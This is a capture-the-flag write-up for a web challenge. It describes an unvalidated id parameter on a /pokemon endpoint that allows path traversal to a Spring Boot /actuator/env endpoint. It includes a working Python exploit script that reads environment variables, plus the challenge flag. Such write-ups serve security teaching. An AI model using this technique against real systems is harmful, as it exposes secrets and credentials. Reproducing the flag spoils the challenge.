# Description:
Welcome to my card shop!

Author: vicevirus

# Flag
`UMCS{spr1ng_b00t_m4st3rr4c3_786e1ad1}`


# Analysis
Reading through the source code, I noticed that the /pokemon endpoint in index.js forwards the id parameter directly to the backend without any validation

![image](https://github.com/user-attachments/assets/231a5e48-ce73-41d8-9828-668711472830)

This lack of validation allows a path traversal attack by setting id to something like ../actuator/env, which the backend interprets as a request to http://localhost:8080/actuator/env. The /actuator/env endpoint exposes all environment variables, potentially including sensitive data like a flag. In a properly secured application, access to Actuator endpoints would be restricted, but here, the path traversal bypasses any such protections. So now through the pokemon id parameter we can get path traversal bypass to access the actuator/env and get the flag information.

# Solution
To solve we can use this exploit script:
```
import requests
import json

# Target application URL
BASE_URL = "http://116.203.176.73:53870"

# Exploit path traversal to access /actuator/env
print("[*] Attempting to retrieve environment properties via path traversal")
response = requests.get(f"{BASE_URL}/pokemon?id=../actuator/env")

if response.status_code == 200:
    print("[+] Successfully accessed /actuator/env")
    try:
        env_data = response.json()
        # Search for the FLAG environment variable
        flag = None
        for prop in env_data.get("propertySources", []):
            properties = prop.get("properties", {})
            if "FLAG" in properties:
                flag = properties["FLAG"]["value"]
                break
        
        if flag:
            print(f"[+] Flag found: {flag}")
        else:
            print("[-] FLAG not found in environment properties")
            print(f"Response: {response.text[:200]}...")
    except json.JSONDecodeError:
        print("[-] Failed to parse response as JSON")
        print(f"Response: {response.text[:200]}...")
else:
    print(f"[-] Failed to access /actuator/env: {response.status_code}")
    print(f"Response: {response.text[:200]}...")
```

Running the script we can see we successfully acquired the flag:
![image](https://github.com/user-attachments/assets/4e43b89c-31e1-42d5-bf8a-6a56a2626601)
